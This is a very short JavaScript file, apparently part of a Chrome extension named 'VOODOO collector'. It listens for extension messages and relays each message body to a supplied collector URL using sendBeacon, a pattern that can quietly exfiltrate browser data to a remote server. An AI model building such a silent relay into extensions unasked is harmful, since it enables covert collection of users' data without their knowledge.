/**
 * VOODOO collector
 */
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    navigator.sendBeacon(request.collector_url, request.body);
    sendResponse(1)
});